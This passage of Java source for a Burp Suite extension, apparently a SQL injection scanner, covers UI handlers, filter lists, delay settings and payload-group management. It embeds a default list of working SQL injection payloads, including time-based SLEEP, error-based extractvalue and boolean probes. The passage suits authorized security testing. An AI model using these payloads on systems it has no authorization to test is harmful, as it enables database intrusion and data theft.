                api.logging().logToOutput("启动 监控Repeater");
                clicksRepeater = 64;
            } else {
                api.logging().logToOutput("关闭 监控Repeater");
                clicksRepeater = 0;
            }
        });

        chkbox3.addItemListener(e -> {
            if (chkbox3.isSelected()) {
                api.logging().logToOutput("启动 监控Proxy");
                clicksProxy = 4;
            } else {
                api.logging().logToOutput("关闭 监控Proxy");
                clicksProxy = 0;
            }
        });

        chkbox4.addItemListener(e -> {
            if (chkbox4.isSelected()) {
                api.logging().logToOutput("启动 值是数字则进行-1、-0");
                isInt = 1;
            } else {
                api.logging().logToOutput("关闭 值是数字则进行-1、-0");
                isInt = 0;
            }
        });

        chkbox5.addItemListener(e -> {
            if (chkbox5.isSelected()) {
                api.logging().logToOutput("启动 自定义payload");
                payloadTextArea.setEditable(true);
                payloadTextArea.setBackground(Color.WHITE);
                jTextAreaInt = 1;

                if (diyPayload1 == 1) {
                    String temp = payloadTextArea.getText();
                    temp = temp.replaceAll(" ", "%20");
                    jTextAreaData1 = temp;
                } else {
                    jTextAreaData1 = payloadTextArea.getText();
                }
            } else {
                api.logging().logToOutput("关闭 自定义payload");
                payloadTextArea.setEditable(false);
                payloadTextArea.setBackground(Color.LIGHT_GRAY);
                jTextAreaInt = 0;
            }
        });

        chkbox6.addItemListener(e -> {
            if (chkbox6.isSelected()) {
                api.logging().logToOutput("启动 空格url编码");
                diyPayload1 = 1;

                String temp = payloadTextArea.getText();
                temp = temp.replaceAll(" ", "%20");
                jTextAreaData1 = temp;
            } else {
                api.logging().logToOutput("关闭 空格url编码");
                diyPayload1 = 0;
                jTextAreaData1 = payloadTextArea.getText();
            }
        });

        chkbox7.addItemListener(e -> {
            if (chkbox7.isSelected()) {
                api.logging().logToOutput("启动 自定义payload参数值置空");
                diyPayload2 = 1;
            } else {
                api.logging().logToOutput("关闭 自定义payload参数值置空");
                diyPayload2 = 0;
            }
        });

        chkbox8.addItemListener(e -> {
            if (chkbox8.isSelected()) {
                api.logging().logToOutput("启动 测试Cookie");
            } else {
                api.logging().logToOutput("关闭 测试Cookie");
            }
        });

        // 参数过滤模式选择事件监听器
        noFilterRadio.addActionListener(e -> {
            if (noFilterRadio.isSelected()) {
                paramListMode = 0;
                paramListTextArea.setText(""); // 无过滤模式清空文本框
                paramListTextArea.setEditable(false); // 禁用编辑
                api.logging().logToOutput("参数过滤模式: 无过滤");
            }
        });

        whiteListRadio.addActionListener(e -> {
            if (whiteListRadio.isSelected()) {
                paramListMode = 1;
                paramListTextArea.setEditable(true); // 启用编辑
                // 加载白名单参数到文本框
                loadWhiteListToTextArea();
                api.logging().logToOutput("参数过滤模式: 白名单模式");
            }
        });

        blackListRadio.addActionListener(e -> {
            if (blackListRadio.isSelected()) {
                paramListMode = 2;
                paramListTextArea.setEditable(true); // 启用编辑
                // 加载黑名单参数到文本框
                loadBlackListToTextArea();
                api.logging().logToOutput("参数过滤模式: 黑名单模式");
            }
        });

        // 保存参数配置按钮事件监听器
        saveParamListBtn.addActionListener(e -> {
            try {
                String paramListText = paramListTextArea.getText();

                // 保存参数过滤模式
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_param_filter_mode.ini")))) {
                    out.write(String.valueOf(paramListMode));
                }

                // 根据当前模式保存参数列表
                if (paramListMode == 1) { // 白名单模式
                    // 保存到白名单配置文件
                    try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_whitelist.ini")))) {
                        out.write(paramListText);
                    }
                    // 更新白名单列表
                    whiteListParams.clear();
                    for (String line : paramListText.split("\\n")) {
                        String trimmedLine = line.trim();
                        if (!trimmedLine.isEmpty()) {
                            whiteListParams.add(trimmedLine);
                        }
                    }
                    api.logging().logToOutput("白名单参数已更新，共" + whiteListParams.size() + "个");
                } else if (paramListMode == 2) { // 黑名单模式
                    // 保存到黑名单配置文件
                    try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_blacklist.ini")))) {
                        out.write(paramListText);
                    }
                    // 更新黑名单列表
                    blackListParams.clear();
                    for (String line : paramListText.split("\\n")) {
                        String trimmedLine = line.trim();
                        if (!trimmedLine.isEmpty()) {
                            blackListParams.add(trimmedLine);
                        }
                    }
                    api.logging().logToOutput("黑名单参数已更新，共" + blackListParams.size() + "个");
                }

                api.logging().logToOutput("参数过滤模式已保存: " + paramListMode);
                JOptionPane.showMessageDialog(null, "参数配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存参数配置失败: " + ex.getMessage());
                ex.printStackTrace();
            }
        });

        // 读取黑名单配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist.ini")))) {
            String str;
            blackListParams.clear();
            while ((str = in.readLine()) != null) {
                String trimmedLine = str.trim();
                if (!trimmedLine.isEmpty()) {
                    blackListParams.add(trimmedLine);
                }
            }
            api.logging().logToOutput("已加载黑名单参数，共" + blackListParams.size() + "个");
        } catch (IOException e) {
            // 忽略，使用空列表
        }

        // 读取白名单配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_whitelist.ini")))) {
            String str;
            whiteListParams.clear();
            while ((str = in.readLine()) != null) {
                String trimmedLine = str.trim();
                if (!trimmedLine.isEmpty()) {
                    whiteListParams.add(trimmedLine);
                }
            }
            api.logging().logToOutput("已加载白名单参数，共" + whiteListParams.size() + "个");
        } catch (IOException e) {
            // 忽略，使用空列表
        }

        // 读取参数过滤模式配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_param_filter_mode.ini")))) {
            String modeText = in.readLine();
            if (modeText != null && !modeText.trim().isEmpty()) {
                paramListMode = Integer.parseInt(modeText.trim());
                // 根据读取的模式设置单选按钮状态
                switch (paramListMode) {
                    case 0:
                        noFilterRadio.setSelected(true);
                        paramListTextArea.setText("");
                        paramListTextArea.setEditable(false);
                        break;
                    case 1:
                        whiteListRadio.setSelected(true);
                        paramListTextArea.setEditable(true);
                        // 显示白名单内容
                        loadWhiteListToTextArea();
                        break;
                    case 2:
                        blackListRadio.setSelected(true);
                        paramListTextArea.setEditable(true);
                        // 显示黑名单内容
                        loadBlackListToTextArea();
                        break;
                }
                api.logging().logToOutput("已加载参数过滤模式: " + paramListMode);
            }
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
            paramListMode = 0;
            noFilterRadio.setSelected(true);
            paramListTextArea.setText("");
            paramListTextArea.setEditable(false);
        }

        btn1.addActionListener(e -> {
            log.clear();
            log2.clear();
            log3.clear();
            log4Md5.clear();
            count = 0;
            fireTableRowsInserted(log.size(), log.size());
            model.fireTableRowsInserted(log3.size(), log3.size());
        });

        // 保存payload按钮事件监听器
        savePayloadBtn.addActionListener(e -> {
            // 保存当前payload到配置文件
            String payloadContent;
            if (diyPayload1 == 1) {
                String temp = payloadTextArea.getText();
                temp = temp.replaceAll(" ", "%20");
                payloadContent = temp;
            } else {
                payloadContent = payloadTextArea.getText();
            }
            
            // 保存到当前组的配置文件
            saveCurrentGroupPayload(payloadContent);
            jTextAreaData1 = payloadContent;
            
            api.logging().logToOutput("已保存payload到组: " + currentGroup);
            JOptionPane.showMessageDialog(null, "Payload已保存到组: " + currentGroup, "保存成功", JOptionPane.INFORMATION_MESSAGE);
        });

        btn2.addActionListener(e -> {
            // 重新从配置文件加载当前组的payload
            loadCurrentGroupPayload();
            api.logging().logToOutput("已重新加载组: " + currentGroup + " 的payload");
            JOptionPane.showMessageDialog(null, "已重新加载组: " + currentGroup + " 的payload", "加载成功", JOptionPane.INFORMATION_MESSAGE);
        });

        btn3.addActionListener(e -> {
            if (btn3.getText().equals("启动白名单")) {
                btn3.setText("关闭白名单");
                whiteURL = whiteTextField.getText();
                whiteSwitchs = 1;
                whiteTextField.setEditable(false);
                whiteTextField.setForeground(Color.GRAY);
            } else {
                btn3.setText("启动白名单");
                whiteSwitchs = 0;
                whiteTextField.setEditable(true);
                whiteTextField.setForeground(Color.BLACK);
            }
        });

        // 自定义报错信息保存按钮事件监听器
        saveErrorBtn.addActionListener(e -> {
            try {
                String errorText = errorKeywordsTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_diy_error.ini")))) {
                    out.write(errorText);
                }
                
                // 更新报错关键字列表
                updateErrorKeywordsList();
                
                api.logging().logToOutput("已保存自定义报错信息配置");
                JOptionPane.showMessageDialog(null, "报错信息配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存报错信息配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        // 自定义报错信息复选框事件监听器
        enableCustomErrorCheckBox.addItemListener(e -> {
            if (enableCustomErrorCheckBox.isSelected()) {
                api.logging().logToOutput("启用自定义报错信息检测");
                enableCustomError = 1;
                errorKeywordsTextArea.setEditable(false);
                errorKeywordsTextArea.setBackground(Color.LIGHT_GRAY);

                // 更新报错关键字列表
                updateErrorKeywordsList();
            } else {
                api.logging().logToOutput("关闭自定义报错信息检测");
                enableCustomError = 0;
                errorKeywordsTextArea.setEditable(true);
                errorKeywordsTextArea.setBackground(Color.WHITE);
            }
        });

        // 报错信息编辑框失去焦点时更新列表
        errorKeywordsTextArea.addFocusListener(new java.awt.event.FocusAdapter() {
            @Override
            public void focusLost(java.awt.event.FocusEvent evt) {
                if (enableCustomError == 0) { // 只有在未启用时才更新

                    updateErrorKeywordsList();
                }
            }
        });

        // 响应时间阈值保存按钮事件监听器
        saveResponseTimeThresholdBtn.addActionListener(e -> {
            try {
                String thresholdText = responseTimeThresholdField.getText().trim();
                int newThreshold = Integer.parseInt(thresholdText);
                if (newThreshold < 100) {
                    JOptionPane.showMessageDialog(null, "阈值不能小于100毫秒", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                if (newThreshold > 10000) {
                    JOptionPane.showMessageDialog(null, "阈值不能大于10000毫秒", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }

                responseTimeThreshold = newThreshold;
                api.logging().logToOutput("响应时间阈值已更新为: " + responseTimeThreshold + "毫秒");

                // 保存到配置文件
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_response_time_threshold.ini")))) {
                    out.write(String.valueOf(responseTimeThreshold));
                }

                JOptionPane.showMessageDialog(null, "响应时间阈值已保存: " + responseTimeThreshold + "毫秒", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字", "错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存阈值配置失败: " + ex.getMessage());
            }
        });

        // 初始化时读取响应时间阈值配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_response_time_threshold.ini")))) {
            String thresholdText = in.readLine();
            if (thresholdText != null && !thresholdText.trim().isEmpty()) {
                responseTimeThreshold = Integer.parseInt(thresholdText.trim());
                responseTimeThresholdField.setText(String.valueOf(responseTimeThreshold));
                api.logging().logToOutput("已加载响应时间阈值: " + responseTimeThreshold + "毫秒");
            }
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
        }

        // 新建payload组按钮事件监听器
        newGroupBtn.addActionListener(e -> {
            String newGroupName = newGroupNameField.getText();
            createNewGroup(newGroupName);
        });

        // 删除payload组按钮事件监听器
        deleteGroupBtn.addActionListener(e -> {
            deleteCurrentGroup();
        });

        // 重命名payload组按钮事件监听器
        renameGroupBtn.addActionListener(e -> {
            String newGroupName = newGroupNameField.getText();
            renameCurrentGroup(newGroupName);
        });


        // 切换payload组组合框事件监听器
        payloadGroupComboBox.addActionListener(e -> {
            String selectedGroup = (String) payloadGroupComboBox.getSelectedItem();
            if (selectedGroup != null && !selectedGroup.equals(currentGroup)) {
                switchToGroup(selectedGroup);
            }
        });

        // 长度差异阈值保存按钮事件监听器
        saveLengthDiffThresholdBtn.addActionListener(e -> {
            try {
                String thresholdText = lengthDiffThresholdField.getText().trim();
                int newThreshold = Integer.parseInt(thresholdText);
                if (newThreshold < 1) {
                    JOptionPane.showMessageDialog(null, "阈值不能小于1字节", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                if (newThreshold > 10000) {
                    JOptionPane.showMessageDialog(null, "阈值不能大于10000字节", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }

                lengthDiffThreshold = newThreshold;
                api.logging().logToOutput("长度差异阈值已更新为: " + lengthDiffThreshold + "字节");

                // 保存到配置文件
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_length_diff_threshold.ini")))) {
                    out.write(String.valueOf(lengthDiffThreshold));
                }

                JOptionPane.showMessageDialog(null, "长度差异阈值已保存: " + lengthDiffThreshold + "字节", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字", "错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存长度差异阈值配置失败: " + ex.getMessage());
            }
        });

        // 初始化时读取长度差异阈值配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_length_diff_threshold.ini")))) {
            String thresholdText = in.readLine();
            if (thresholdText != null && !thresholdText.trim().isEmpty()) {
                lengthDiffThreshold = Integer.parseInt(thresholdText.trim());
                lengthDiffThresholdField.setText(String.valueOf(lengthDiffThreshold));
                api.logging().logToOutput("已加载长度差异阈值: " + lengthDiffThreshold + "字节");
            }
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
        }

        // 黑名单URL保存按钮事件监听器
        saveBlackListUrlBtn.addActionListener(e -> {
            try {
                String urlListText = blackListUrlTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_blacklist_urls.ini")))) {
                    out.write(urlListText);
                }
                
                // 更新黑名单URL列表
                blackListUrls.clear();
                for (String line : urlListText.split("\\n")) {
                    String trimmedLine = line.trim();
                    if (!trimmedLine.isEmpty()) {
                        blackListUrls.add(trimmedLine);
                    }
                }
                
                api.logging().logToOutput("已保存黑名单URL配置，共" + blackListUrls.size() + "条");
                JOptionPane.showMessageDialog(null, "黑名单URL配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存黑名单URL配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        // 延时配置事件监听器
        noDelayRadio.addActionListener(e -> {
            if (noDelayRadio.isSelected()) {
                delayMode = 0;
                api.logging().logToOutput("延时模式: 无延时");
            }
        });

        fixedDelayRadio.addActionListener(e -> {
            if (fixedDelayRadio.isSelected()) {
                delayMode = 1;
                api.logging().logToOutput("延时模式: 固定延时");
            }
        });

        randomDelayRadio.addActionListener(e -> {
            if (randomDelayRadio.isSelected()) {
                delayMode = 2;
                api.logging().logToOutput("延时模式: 随机延时");
            }
        });

        // 保存延时配置按钮事件监听器
        saveDelayConfigBtn.addActionListener(e -> {
            try {
                // 保存固定延时
                String fixedDelayText = fixedDelayField.getText().trim();
                if (!fixedDelayText.isEmpty()) {
                    fixedDelay = Integer.parseInt(fixedDelayText);
                }

                // 保存随机延时范围
                String minDelayText = randomDelayMinField.getText().trim();
                String maxDelayText = randomDelayMaxField.getText().trim();
                if (!minDelayText.isEmpty()) {
                    randomDelayMin = Integer.parseInt(minDelayText);
                }
                if (!maxDelayText.isEmpty()) {
                    randomDelayMax = Integer.parseInt(maxDelayText);
                }

                // 验证随机延时范围
                if (randomDelayMin >= randomDelayMax) {
                    JOptionPane.showMessageDialog(null, "随机延时最小值必须小于最大值！", "配置错误", JOptionPane.ERROR_MESSAGE);
                    return;
                }

                // 保存到配置文件
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_delay_config.ini")))) {
                    out.write("delayMode=" + delayMode + "\n");
                    out.write("fixedDelay=" + fixedDelay + "\n");
                    out.write("randomDelayMin=" + randomDelayMin + "\n");
                    out.write("randomDelayMax=" + randomDelayMax + "\n");
                }

                api.logging().logToOutput("延时配置已保存: 模式=" + delayMode + ", 固定=" + fixedDelay + "ms, 随机=" + randomDelayMin + "-" + randomDelayMax + "ms");
                JOptionPane.showMessageDialog(null, "延时配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字！", "输入错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存延时配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        // 追加参数配置事件监听器
        enableAppendParamsCheckBox.addItemListener(e -> {
            enableAppendParams = enableAppendParamsCheckBox.isSelected();
            api.logging().logToOutput("追加参数功能: " + (enableAppendParams ? "启用" : "禁用"));
        });

        // 保存追加参数配置按钮事件监听器
        saveAppendParamsBtn.addActionListener(e -> {
            try {
                appendParamsText = appendParamsTextArea.getText().trim();

                if (enableAppendParams && appendParamsText.isEmpty()) {
                    JOptionPane.showMessageDialog(null, "启用追加参数时，参数列表不能为空！", "配置错误", JOptionPane.ERROR_MESSAGE);
                    return;
                }

                // 验证参数格式
                if (enableAppendParams && !appendParamsText.isEmpty()) {
                    String[] lines = appendParamsText.split("\n");
                    for (String line : lines) {
                        line = line.trim();
                        if (!line.isEmpty() && !line.contains(":")) {
                            JOptionPane.showMessageDialog(null, 
                                "参数格式错误！请使用 key:value 格式，每行一个参数。\n错误行: " + line, 
                                "格式错误", JOptionPane.ERROR_MESSAGE);
                            return;
                        }
                    }
                }

                // 保存到配置文件
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_append_params.ini")))) {
                    out.write("enableAppendParams=" + enableAppendParams + "\n");
                    out.write("appendParamsText=" + appendParamsText.replace("\n", "\\n") + "\n");
                    
                    // 保存每个参数的测试开关状态
                    for (Map.Entry<String, Boolean> entry : appendParamsTestMap.entrySet()) {
                        out.write("paramTest_" + entry.getKey() + "=" + entry.getValue() + "\n");
                    }
                }

                int testCount = 0;
                for (Boolean test : appendParamsTestMap.values()) {
                    if (test) testCount++;
                }
                
                api.logging().logToOutput("追加参数配置已保存: " + (enableAppendParams ? "启用" : "禁用") + 
                                        ", 参数数量=" + (appendParamsText.isEmpty() ? 0 : appendParamsText.split("\n").length) +
                                        ", 参与测试=" + testCount + "个");
                JOptionPane.showMessageDialog(null, "追加参数配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存追加参数配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        // 初始化时读取延时配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_delay_config.ini")))) {
            String line;
            while ((line = in.readLine()) != null) {
                if (line.startsWith("delayMode=")) {
                    delayMode = Integer.parseInt(line.substring(10));
                } else if (line.startsWith("fixedDelay=")) {
                    fixedDelay = Integer.parseInt(line.substring(11));
                } else if (line.startsWith("randomDelayMin=")) {
                    randomDelayMin = Integer.parseInt(line.substring(15));
                } else if (line.startsWith("randomDelayMax=")) {
                    randomDelayMax = Integer.parseInt(line.substring(15));
                }
            }
            // 更新UI
            noDelayRadio.setSelected(delayMode == 0);
            fixedDelayRadio.setSelected(delayMode == 1);
            randomDelayRadio.setSelected(delayMode == 2);
            fixedDelayField.setText(String.valueOf(fixedDelay));
            randomDelayMinField.setText(String.valueOf(randomDelayMin));
            randomDelayMaxField.setText(String.valueOf(randomDelayMax));
            api.logging().logToOutput("已加载延时配置: 模式=" + delayMode + ", 固定=" + fixedDelay + "ms, 随机=" + randomDelayMin + "-" + randomDelayMax + "ms");
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
        }

        // 初始化时读取追加参数配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_append_params.ini")))) {
            String line;
            while ((line = in.readLine()) != null) {
                if (line.startsWith("enableAppendParams=")) {
                    enableAppendParams = Boolean.parseBoolean(line.substring(19));
                } else if (line.startsWith("appendParamsText=")) {
                    appendParamsText = line.substring(17).replace("\\n", "\n");
                } else if (line.startsWith("paramTest_")) {
                    // 读取每个参数的测试开关状态
                    String paramTestLine = line.substring(10); // 移除 "paramTest_" 前缀
                    int equalIndex = paramTestLine.indexOf("=");
                    if (equalIndex > 0) {
                        String paramName = paramTestLine.substring(0, equalIndex);
                        boolean testEnabled = Boolean.parseBoolean(paramTestLine.substring(equalIndex + 1));
                        appendParamsTestMap.put(paramName, testEnabled);
                    }
                }
            }
            // 更新UI
            enableAppendParamsCheckBox.setSelected(enableAppendParams);
            appendParamsTextArea.setText(appendParamsText);
            
            // 更新右侧测试面板
            updateParamTestPanel();
            
            int paramCount = appendParamsText.isEmpty() ? 0 : appendParamsText.split("\n").length;
            int testCount = 0;
            for (Boolean test : appendParamsTestMap.values()) {
                if (test) testCount++;
            }
            api.logging().logToOutput("已加载追加参数配置: " + (enableAppendParams ? "启用" : "禁用") + 
                                    ", 参数数量=" + paramCount + ", 参与测试=" + testCount + "个");
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        // 初始化时读取黑名单URL配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist_urls.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            blackListUrlTextArea.setText(strData);
            blackListUrls.clear();
            for (String line : strData.split("\\n")) {
                String trimmedLine = line.trim();
                if (!trimmedLine.isEmpty()) {
                    blackListUrls.add(trimmedLine);
                }
            }
            api.logging().logToOutput("已加载黑名单URL配置，共" + blackListUrls.size() + "条");
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        // 初始化payload组
        initializePayloadGroups();
    }

    // 初始化payload分组
    private void initializePayloadGroups() {
        payloadGroups.clear();
        payloadGroupComboBox.removeAllItems();

        // 添加默认组
        payloadGroups.add("default");
        payloadGroupComboBox.addItem("default");

        // 查找所有payload组配置文件
        File configDir = new File(CONFIG_DIR);
        File[] files = configDir.listFiles((dir1, name) -> name.startsWith("xia_SQL_payload_") && name.endsWith(".ini"));

        if (files != null) {
            for (File file : files) {
                String fileName = file.getName();
                // 提取组名：xia_SQL_payload_orderby.ini -> orderby
                // 前缀 "xia_SQL_payload_" 长度为 16 字符
                // 后缀 ".ini" 长度为 4 字符
                String groupName = fileName.substring(16, fileName.length() - 4);
                if (!"default".equals(groupName) && !payloadGroups.contains(groupName)) {
                    payloadGroups.add(groupName);
                    payloadGroupComboBox.addItem(groupName);
                }
            }
        }

        // 设置当前选中的组
        payloadGroupComboBox.setSelectedItem(currentGroup);

        // 加载当前组的payload
        loadCurrentGroupPayload();

        api.logging().logToOutput("已初始化payload组，共" + payloadGroups.size() + "个组");
    }

    // 加载指定组的payload
    private String loadPayloadGroup(String groupName) {
        String filename = "default".equals(groupName) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + groupName + ".ini");

        try (BufferedReader in = new BufferedReader(new FileReader(filename))) {
            StringBuilder strData = new StringBuilder();
            String str;
            while ((str = in.readLine()) != null) {
                strData.append(str).append("\n");
            }
            api.logging().logToOutput("已加载组 '" + groupName + "' 的payload");
            return strData.toString();
        } catch (IOException e) {
            // 如果文件不存在，返回默认payload
            api.logging().logToOutput("组 '" + groupName + "' 的配置文件不存在，使用默认值");
            return "'''\n\"\"\"\n'+Or+1=1+AND+'dark'='dark\n'+Or+1=2+AND+'dark'='dark\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)\n'and/**/extractvalue(1,concat(char(126),user()))and'";
        }
    }

    // 加载当前组的payload
    private void loadCurrentGroupPayload() {
        String filename = "default".equals(currentGroup) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");

        try (BufferedReader in = new BufferedReader(new FileReader(filename))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
            api.logging().logToOutput("已加载组 '" + currentGroup + "' 的payload");
        } catch (IOException e) {
            // 如果文件不存在，显示默认payload
            payloadTextArea.setText("'''\n\"\"\"\n'+Or+1=1+AND+'dark'='dark\n'+Or+1=2+AND+'dark'='dark\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)\n'and/**/extractvalue(1,concat(char(126),user()))and'");
            api.logging().logToOutput("组 '" + currentGroup + "' 的配置文件不存在，使用默认值");
        }
    }

    // 保存当前组的payload
    private void saveCurrentGroupPayload(String payloadContent) {
        String filename = "default".equals(currentGroup) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");

        try (BufferedWriter out = new BufferedWriter(new FileWriter(filename))) {
            out.write(payloadContent);
            api.logging().logToOutput("已保存组 '" + currentGroup + "' 的payload到文件: " + filename);
        } catch (IOException e) {
            api.logging().logToOutput("保存组 '" + currentGroup + "' 的payload失败: " + e.getMessage());
        }
    }

    // 创建新的payload组
    private void createNewGroup(String groupName) {
        if (groupName == null || groupName.trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "组名不能为空", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        groupName = groupName.trim();
        if (payloadGroups.contains(groupName)) {
            JOptionPane.showMessageDialog(null, "组名 '" + groupName + "' 已存在", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        // 添加新组
        payloadGroups.add(groupName);
        payloadGroupComboBox.addItem(groupName);
        payloadGroupComboBox.setSelectedItem(groupName);
        currentGroup = groupName;
        newGroupNameField.setText("新组名");

        // 保存当前编辑器的内容到新组
        String currentContent = payloadTextArea.getText();
        saveCurrentGroupPayload(currentContent);

        api.logging().logToOutput("已创建新payload组: " + groupName);
        JOptionPane.showMessageDialog(null, "已创建新组: " + groupName, "成功", JOptionPane.INFORMATION_MESSAGE);
    }

    // 应用请求延时
    private void applyRequestDelay() {
        try {
            int delayTime = 0;
            
            switch (delayMode) {
                case 1: // 固定延时
                    delayTime = fixedDelay;
                    break;
                case 2: // 随机延时
                    delayTime = randomDelayMin + (int)(Math.random() * (randomDelayMax - randomDelayMin));
                    break;
                default: // 无延时
                    return;
            }
            
            if (delayTime > 0) {
                api.logging().logToOutput("    -> 应用延时: " + delayTime + "ms");
                Thread.sleep(delayTime);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            api.logging().logToOutput("延时被中断: " + e.getMessage());
        }
    }

    // 为请求添加追加参数
    private HttpRequest addAppendParameters(HttpRequest originalRequest) {
        if (!enableAppendParams || appendParamsText.isEmpty()) {
            return originalRequest;
        }

        try {
            // 解析参数列表
            List<String[]> paramList = new ArrayList<>();
            String[] lines = appendParamsText.split("\n");
            for (String line : lines) {
                line = line.trim();
                if (!line.isEmpty() && line.contains(":")) {
                    String[] parts = line.split(":", 2); // 限制分割为2部分，防止value中的冒号被分割
                    if (parts.length == 2) {
                        paramList.add(new String[]{parts[0].trim(), parts[1].trim()});
                    }
                }
            }
            
            if (paramList.isEmpty()) {
                return originalRequest;
            }

            String contentType = originalRequest.contentType() != null ? originalRequest.contentType().toString() : "";
            // 获取完整的Content-Type头
            String fullContentType = "";
            if (originalRequest.hasHeader("Content-Type")) {
                fullContentType = originalRequest.headerValue("Content-Type");
            }
            
            api.logging().logToOutput("正在添加追加参数，共" + paramList.size() + "个参数 (ContentType: " + contentType + ", Full: " + fullContentType + ")");

            // 使用更准确的JSON检测
            boolean isJson = (contentType != null && contentType.toLowerCase().contains("json")) ||
                           (fullContentType != null && fullContentType.toLowerCase().contains("application/json"));

            if (isJson) {
                api.logging().logToOutput("检测到JSON格式，尝试添加到JSON body");
                // JSON格式请求
                String body = originalRequest.bodyToString();
                api.logging().logToOutput("JSON body内容: " + (body != null ? body : "null"));
                if (body != null && !body.trim().isEmpty()) {
                    try {
                        JsonUtils jsonUtils = api.utilities().jsonUtils();
                        if (jsonUtils.isValidJson(body)) {
